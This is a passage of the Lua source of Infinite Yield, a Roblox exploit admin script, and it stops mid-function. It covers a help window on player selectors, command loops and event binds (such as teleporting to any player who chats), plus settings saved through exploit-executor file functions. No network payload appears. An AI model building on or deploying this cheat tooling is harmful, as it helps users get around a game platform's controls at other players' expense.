			{56,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={54},Position=UDim2.new(0,70,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone within the given radius",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{57,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{58,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={57},Size=UDim2.new(1,0,1,0),Text="nearest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{59,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={57},Position=UDim2.new(0,43,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the closest player to you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{60,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{61,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={60},Size=UDim2.new(1,0,1,0),Text="farthest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{62,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={60},Position=UDim2.new(0,46,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the farthest player from you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{63,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{64,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={63},Size=UDim2.new(1,0,1,0),Text="group[ID]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{65,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={63},Position=UDim2.new(0,55,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are in a certain group",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{66,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{67,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={66},Size=UDim2.new(1,0,1,0),Text="alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{68,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={66},Position=UDim2.new(0,27,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{69,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{70,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={69},Size=UDim2.new(1,0,1,0),Text="dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{71,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={69},Position=UDim2.new(0,29,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{72,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=-1,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{73,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={72},Size=UDim2.new(1,0,1,0),Text="@username",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{74,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={72},Position=UDim2.new(0,66,0,0),Size=UDim2.new(1,0,1,0),Text="- searches for players by username only (ignores displaynames)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{75,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,180),ZIndex=10,}},
			{76,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={75},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Various Operators",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{77,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={75},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{78,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={75},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,16),Text="Use commas to separate multiple expressions:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{79,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={75},Position=UDim2.new(0,8,0,75),Size=UDim2.new(1,-8,0,16),Text="Use - to exclude, and + to include players in your expression:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{80,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={75},Position=UDim2.new(0,8,0,91),Size=UDim2.new(1,-8,0,16),Text=";locate %blue-friends (gets players in blue team who aren't your friends)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{81,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={75},Position=UDim2.new(0,8,0,46),Size=UDim2.new(1,-8,0,16),Text=";locate noob,noob2,bob",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{82,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={75},Position=UDim2.new(0,8,0,120),Size=UDim2.new(1,-8,0,16),Text="Put ! before a command to run it with the last arguments it was ran with:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{83,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={75},Position=UDim2.new(0,8,0,136),Size=UDim2.new(1,-8,0,32),Text="After running ;offset 0 100 0,  you can run !offset anytime to repeat that command with the same arguments that were used to run it last time",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{84,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,154),ZIndex=10,}},
			{85,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={84},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Command Looping",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{86,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={84},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="Form: [How many times it loops]^[delay (optional)]^[command]",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{87,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={84},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{88,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={84},Position=UDim2.new(0,8,0,50),Size=UDim2.new(1,-8,0,20),Text="Use the 'breakloops' command to stop all running loops.",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{89,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={84},Position=UDim2.new(0,8,0,80),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{90,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={84},Position=UDim2.new(0,8,0,98),Size=UDim2.new(1,-8,0,42),Text=";5^btools - gives you 5 sets of btools\n;10^3^drophats - drops your hats every 3 seconds 10 times\n;inf^0.1^animspeed 100 - infinitely loops your animation speed to 100",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{91,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,120),ZIndex=10,}},
			{92,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={91},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Execute Multiple Commands at Once",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{93,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={91},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="You can execute multiple commands at once using \"\\\"",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{94,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={91},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{95,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={91},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{96,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={91},Position=UDim2.new(0,8,0,78),Size=UDim2.new(1,-8,0,32),Text=";drophats\\respawn - drops your hats and respawns you\n;enable inventory\\enable playerlist\\refresh - enables those coregui items and refreshes you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{97,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
			{98,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={97},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Browse Command History",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{99,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={97},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the up and down arrow keys to browse recently used commands",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{100,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={97},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{101,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
			{102,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={101},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Autocomplete in the Command Bar",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{103,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={101},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the tab key to insert the top suggested command into the command bar.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{104,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={101},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{105,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,175),ZIndex=10,}},
			{106,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={105},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Using Event Binds",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{107,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={105},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="Use event binds to set up commands that get executed when certain events happen. You can edit the conditions for an event command to run (such as which player triggers it).",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{108,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={105},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{109,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={105},Position=UDim2.new(0,8,0,70),Size=UDim2.new(1,-8,0,48),Text="Some events may send arguments; you can use them in your event command by using $ followed by the argument number ($1, $2, etc). You can find out the order and types of these arguments by looking at the settings of the event command.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{110,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={105},Position=UDim2.new(0,8,0,130),Size=UDim2.new(1,-8,0,16),Text="Example:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{111,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={105},Position=UDim2.new(0,8,0,148),Size=UDim2.new(1,-8,0,16),Text="Setting up 'goto $1' on the OnChatted event will teleport you to any player that chats.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{112,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,105),ZIndex=10,}},
			{113,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={112},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Get Further Help",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{114,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={112},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="You can join the Discord server to get support with IY,  and read up on more documentation such as the Plugin API.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{115,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={112},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),Visible=false,ZIndex=10,}},
			{116,"TextButton",{BackgroundColor3=Color3.new(0.48627451062202,0.61960786581039,0.85098040103912),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Font=4,Name="InviteButton",Parent={112},Position=UDim2.new(0,5,0,75),Size=UDim2.new(1,-10,0,25),Text="Copy Discord Invite Link (https://discord.io/infiniteyield)",TextColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),TextSize=16,ZIndex=10,}},
		})
		for i,v in pairs(main.Content.List:GetDescendants()) do
			if v:IsA("TextLabel") then
				table.insert(text1,v)
			end
		end
		table.insert(scroll,main.Content.List)
		table.insert(shade1,main.Content)
		table.insert(shade2,main.TopBar)
		main.Name = randomString()
		main.TopBar.Close.MouseButton1Click:Connect(function()
			main:TweenPosition(UDim2.new(0.5,-250,0,-500), "InOut", "Quart", 0.5, true, nil)
		end)
		local inviteButton = main:FindFirstChild("InviteButton",true)
		local lastPress = nil
		inviteButton.MouseButton1Click:Connect(function()
			local func = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
			if func then
				func("https://discord.io/infiniteyield")
				inviteButton.Text = "Copied"
			else
				inviteButton.Text = "No Clipboard Function, type out the link"
			end
			local pressTime = tick()
			lastPress = pressTime
			wait(2)
			if lastPress ~= pressTime then return end
			inviteButton.Text = "Copy Discord Invite Link (https://discord.io/infiniteyield)"
		end)
		dragGUI(main)
		main.Parent = PARENT

		ReferenceButton.MouseButton1Click:Connect(function()
			main:TweenPosition(UDim2.new(0.5,-250,0.5,-150), "InOut", "Quart", 0.5, true, nil)
		end)
	end)()

	currentShade1 = Color3.fromRGB(36, 36, 37)
	currentShade2 = Color3.fromRGB(46, 46, 47)
	currentShade3 = Color3.fromRGB(78, 78, 79)
	currentText1 = Color3.new(1, 1, 1)
	currentText2 = Color3.new(0, 0, 0)
	currentScroll = Color3.fromRGB(78,78,79)

	defaultsettings = {
		prefix = ';';
		StayOpen = false;
		espTransparency = 0.3;
		keepIY = true;
		logsEnabled = false;
		jLogsEnabled = false;
		aliases = {};
		binds = {};
		WayPoints = {};
		PluginsTable = {};
		currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
		currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
		currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
		currentText1 = {currentText1.R,currentText1.G,currentText1.B};
		currentText2 = {currentText2.R,currentText2.G,currentText2.B};
		currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
		eventBinds = eventEditor.SaveData()
	}

	defaults = HttpService:JSONEncode(defaultsettings)
	nosaves = false

	local loadedEventData = nil
	function saves()
		if writefileExploit() then
			if pcall(function() readfile("IY_FE.iy") end) then
				if readfile("IY_FE.iy") ~= nil then
					local success, response = pcall(function()
						local json = HttpService:JSONDecode(readfile("IY_FE.iy"))
						if json.prefix ~= nil then prefix = json.prefix else prefix = ';' end
						if json.StayOpen ~= nil then StayOpen = json.StayOpen else StayOpen = false end
						if json.keepIY ~= nil then KeepInfYield = json.keepIY else KeepInfYield = true end
						if json.espTransparency ~= nil then espTransparency = json.espTransparency else espTransparency = 0.3 end
						if json.logsEnabled ~= nil then logsEnabled = json.logsEnabled else logsEnabled = false end
						if json.jLogsEnabled ~= nil then jLogsEnabled = json.jLogsEnabled else jLogsEnabled = false end
						if json.aliases ~= nil then aliases = json.aliases else aliases = {} end
						if json.binds ~= nil then binds = (json.binds or {}) else binds = {} end
						if json.spawnCmds ~= nil then spawnCmds = json.spawnCmds end
						if json.WayPoints ~= nil then AllWaypoints = json.WayPoints else WayPoints = {} AllWaypoints = {} end
						if json.PluginsTable ~= nil then PluginsTable = json.PluginsTable else PluginsTable = {} end
						if json.currentShade1 ~= nil then currentShade1 = Color3.new(json.currentShade1[1],json.currentShade1[2],json.currentShade1[3]) end
						if json.currentShade2 ~= nil then currentShade2 = Color3.new(json.currentShade2[1],json.currentShade2[2],json.currentShade2[3]) end
						if json.currentShade3 ~= nil then currentShade3 = Color3.new(json.currentShade3[1],json.currentShade3[2],json.currentShade3[3]) end
						if json.currentText1 ~= nil then currentText1 = Color3.new(json.currentText1[1],json.currentText1[2],json.currentText1[3]) end
						if json.currentText2 ~= nil then currentText2 = Color3.new(json.currentText2[1],json.currentText2[2],json.currentText2[3]) end
						if json.currentScroll ~= nil then currentScroll = Color3.new(json.currentScroll[1],json.currentScroll[2],json.currentScroll[3]) end
						if json.eventBinds ~= nil then loadedEventData = json.eventBinds end
					end)
					if not success then
						warn("Save Json Error:", response)
						warn("Overwriting Save File")
						writefileCooldown("IY_FE.iy", defaults)
						wait()
						saves()
					end
				else
					writefileCooldown("IY_FE.iy", defaults)
					wait()
					saves()
				end
			else
				writefileCooldown("IY_FE.iy", defaults)
				wait()
				if pcall(function() readfile("IY_FE.iy") end) then
					saves()
				else
					nosaves = true
					prefix = ';'
					StayOpen = false
					KeepInfYield = true
					espTransparency = 0.3
					logsEnabled = false
					jLogsEnabled = false
					aliases = {}
					binds = {}
					WayPoints = {}
					PluginsTable = {}

					local FileError = Instance.new("Frame")
					local background = Instance.new("Frame")
					local Directions = Instance.new("TextLabel")
					local shadow = Instance.new("Frame")
					local PopupText = Instance.new("TextLabel")
					local Exit = Instance.new("TextButton")
					local ExitImage = Instance.new("ImageLabel")

					FileError.Name = randomString()
					FileError.Parent = PARENT
					FileError.Active = true
					FileError.BackgroundTransparency = 1
					FileError.Position = UDim2.new(0.5, -180, 0, 290)
					FileError.Size = UDim2.new(0, 360, 0, 20)
					FileError.ZIndex = 10

					background.Name = "background"
					background.Parent = FileError
					background.Active = true
					background.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
					background.BorderSizePixel = 0
					background.Position = UDim2.new(0, 0, 0, 20)
					background.Size = UDim2.new(0, 360, 0, 205)
					background.ZIndex = 10

					Directions.Name = "Directions"
					Directions.Parent = background
					Directions.BackgroundTransparency = 1
					Directions.BorderSizePixel = 0
					Directions.Position = UDim2.new(0, 10, 0, 10)
					Directions.Size = UDim2.new(0, 340, 0, 185)
					Directions.Font = Enum.Font.SourceSans
					Directions.TextSize = 14
					Directions.Text = "There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again."
					Directions.TextColor3 = Color3.new(1, 1, 1)
					Directions.TextWrapped = true
					Directions.TextXAlignment = Enum.TextXAlignment.Left
					Directions.TextYAlignment = Enum.TextYAlignment.Top
					Directions.ZIndex = 10

					shadow.Name = "shadow"
					shadow.Parent = FileError
					shadow.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
					shadow.BorderSizePixel = 0
					shadow.Size = UDim2.new(0, 360, 0, 20)
					shadow.ZIndex = 10

					PopupText.Name = "PopupText"
					PopupText.Parent = shadow
					PopupText.BackgroundTransparency = 1
					PopupText.Size = UDim2.new(1, 0, 0.95, 0)
					PopupText.ZIndex = 10
					PopupText.Font = Enum.Font.SourceSans
					PopupText.TextSize = 14
					PopupText.Text = "File Error"
					PopupText.TextColor3 = Color3.new(1, 1, 1)
					PopupText.TextWrapped = true

					Exit.Name = "Exit"
					Exit.Parent = shadow
					Exit.BackgroundTransparency = 1
					Exit.Position = UDim2.new(1, -20, 0, 0)
					Exit.Size = UDim2.new(0, 20, 0, 20)
					Exit.Text = ""
					Exit.ZIndex = 10

					ExitImage.Parent = Exit
					ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
					ExitImage.BackgroundTransparency = 1
					ExitImage.Position = UDim2.new(0, 5, 0, 5)
					ExitImage.Size = UDim2.new(0, 10, 0, 10)
					ExitImage.Image = "rbxassetid://5054663650"
					ExitImage.ZIndex = 10

					Exit.MouseButton1Click:Connect(function()
						FileError:Destroy()
					end)
				end
			end
		else
			prefix = ';'
			StayOpen = false
			KeepInfYield = true
			espTransparency = 0.3
			logsEnabled = false
			jLogsEnabled = false
			aliases = {}
			binds = {}
			WayPoints = {}
			PluginsTable = {}
		end
	end

	saves()

	function updatesaves()
		if nosaves == false and writefileExploit() then
			local update = {
				prefix = prefix;
				StayOpen = StayOpen;
				keepIY = KeepInfYield;
				espTransparency = espTransparency;
				logsEnabled = logsEnabled;
				jLogsEnabled = jLogsEnabled;
				aliases = aliases;
				binds = binds or {};
				WayPoints = AllWaypoints;
				PluginsTable = PluginsTable;
				currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
				currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
				currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
				currentText1 = {currentText1.R,currentText1.G,currentText1.B};
				currentText2 = {currentText2.R,currentText2.G,currentText2.B};
				currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
				eventBinds = eventEditor.SaveData()
			}
			writefileCooldown("IY_FE.iy", HttpService:JSONEncode(update))
		end
	end

	eventEditor.SetOnEdited(updatesaves)

	pWayPoints = {}
	WayPoints = {}

	if #AllWaypoints > 0 then
		for i = 1, #AllWaypoints do
			if not AllWaypoints[i].GAME or AllWaypoints[i].GAME == PlaceId then
				WayPoints[#WayPoints + 1] = {NAME = AllWaypoints[i].NAME, COORD = {AllWaypoints[i].COORD[1], AllWaypoints[i].COORD[2], AllWaypoints[i].COORD[3]}, GAME = AllWaypoints[i].GAME}
			end
		end
	end

	if type(binds) ~= "table" then binds = {} end

	function Time()
		local HOUR = math.floor((tick() % 86400) / 3600)
		local MINUTE = math.floor((tick() % 3600) / 60)
		local SECOND = math.floor(tick() % 60)
		local AP = HOUR > 11 and 'PM' or 'AM'
		HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
		HOUR = HOUR < 10 and '0' .. HOUR or HOUR
		MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
		SECOND = SECOND < 10 and '0' .. SECOND or SECOND
		return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP
	end

	PrefixBox.Text = prefix
	local SettingsOpen = false
	local isHidden = false

	if StayOpen == false then
		On.BackgroundTransparency = 1
	else
		On.BackgroundTransparency = 0
	end

	if logsEnabled then
		Toggle.Text = 'Enabled'
	else
		Toggle.Text = 'Disabled'
	end

	if jLogsEnabled then
		Toggle_2.Text = 'Enabled'
	else
		Toggle_2.Text = 'Disabled'
	end

	function maximizeHolder()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -220), "InOut", "Quart", 0.2, true, nil)
		end
	end

	local minimizeNum = -20
	function minimizeHolder()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, minimizeNum), "InOut", "Quart", 0.5, true, nil)
		end
	end

	function cmdbarHolder()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -45), "InOut", "Quart", 0.5, true, nil)
		end
	end

	pinNotification = nil
	local notifyCount = 0
	function notify(text,text2,length)
		task.spawn(function()
			local LnotifyCount = notifyCount+1
			local notificationPinned = false
			notifyCount = notifyCount+1
			if pinNotification then pinNotification:Disconnect() end
			pinNotification = PinButton.MouseButton1Click:Connect(function()
				task.spawn(function()
					pinNotification:Disconnect()
					notificationPinned = true
					Title_2.BackgroundTransparency = 1
					wait(0.5)
